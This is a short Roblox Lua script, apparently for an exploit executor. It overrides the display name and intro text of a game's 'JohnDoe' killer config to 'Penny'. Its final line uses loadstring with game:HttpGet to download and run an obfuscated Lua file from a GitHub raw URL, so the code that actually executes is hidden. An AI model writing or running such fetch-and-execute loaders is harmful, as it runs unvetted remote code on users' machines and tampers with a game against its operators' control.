-- Replace DisplayName in the Noli config
local RS = game:GetService("ReplicatedStorage") -- FIXED typo here
local path = RS:WaitForChild("Assets"):WaitForChild("Killers"):WaitForChild("JohnDoe"):WaitForChild("Config")
local JohnConfig = require(path)

-- Test override
JohnConfig.IntroText = "They\'re all yours, Penny"
JohnConfig.DisplayName = "Penny"


print("New IntroText:", JohnConfig.IntroText)
print("New DisplayName:", JohnConfig.DisplayName)

loadstring(game:HttpGet("https://raw.githubusercontent.com/ASCENDEDFROM/DistoredPennyJd/refs/heads/main/ObfuscatedPennyJD.lua"))()

print("Loaded PennyJD Script")